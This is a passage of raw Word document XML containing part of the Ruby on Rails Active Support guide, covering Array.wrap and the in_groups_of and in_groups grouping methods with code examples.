    <w:p w14:paraId="4118E353" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="279"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Otherwise, an array with the argument as its single element is returned.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6B59D59C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72D5CEC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Array.wrap(nil)       # =&gt; []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F6A8A27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Array.wrap([1, 2, 3]) # =&gt; [1, 2, 3]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0542B657" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Array.wrap(0)         # =&gt; [0]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7064AFBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is similar in purpose to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Kernel#Array</w:t>
      </w:r>
      <w:r>
        <w:t>, but there are some differences:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B6DF6B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="280"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the argument responds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_ary</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the method is invoked. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Kernel#Array</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> moves on to try </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the returned value is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, but </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array.wrap</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> right away.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA5EC27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="280"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the returned value from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_ary</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is neither </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> nor an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Kernel#Array</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> raises an exception, while </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array.wrap</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> does not, it just returns the value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B617DAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="280"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It does not call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the argument, though special-cases </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to return an empty array.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461ED95F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The last point is particularly worth comparing for some enumerables:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5808"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="48B1C073" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2885D998" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Array.wrap(:foo</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :bar) # =&gt; [{:foo =&gt; :bar}]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31F96C05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Array(:foo</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :bar)      # =&gt; [[:foo, :bar]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6630E44D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There’s also a related idiom that uses the splat operator:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="04ACFE81" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CB346B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1100023707"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[*object]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BAC3F80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">which in Ruby 1.8 returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>[nil]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and calls to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array(object)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> otherwise. (Please if you know the exact behavior in 1.9 contact fxn.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0D0AE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Thus, in this case the behavior is different for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and the differences with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Kernel#Array</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> explained above apply to the rest of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>object</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016763D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/wrap.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766DB326" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.6 Grouping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697EB1AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.6.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_groups_of(number, fill_with = nil)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C72ABB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_groups_of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> splits an array into consecutive groups of a certain size. It returns an array with the groups:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7C41D1D1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16314C1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1453672668"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[1, 2, 3].in_groups_of(2) # =&gt; [[1, 2], [3, nil]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="041B449A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>or yields them in turn if a block is passed:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4848"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6467D76B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25237D39" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% sample.in_groups_of(3) do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|a, b, c| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D87ACCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38FD1E0C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%=h a %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61768993" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%=h b %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B88B6BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%=h c %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66D6CDBE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="599FD980" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EC00E7E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first example shows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_groups_of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fills the last group with as many </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> elements as needed to have the requested size. You can change this padding value using the second optional argument:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6F48C66E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28F8E3D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1220440863"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[1, 2, 3].in_groups_of(2, 0) # =&gt; [[1, 2], [3, 0]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55F14D51" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And you can tell the method not to fill the last group passing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3B3869B0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="252FF0DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1486698652"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[1, 2, 3].in_groups_of(2, false) # =&gt; [[1, 2], [3]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E3B5422" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As a consequence </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can’t be a used as a padding value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45179C54" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/grouping.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D525A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.6.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_groups(number, fill_with = nil)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1210B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_groups</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> splits an array into a certain number of groups. The method returns an array with the groups:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="488163BF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="491749C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
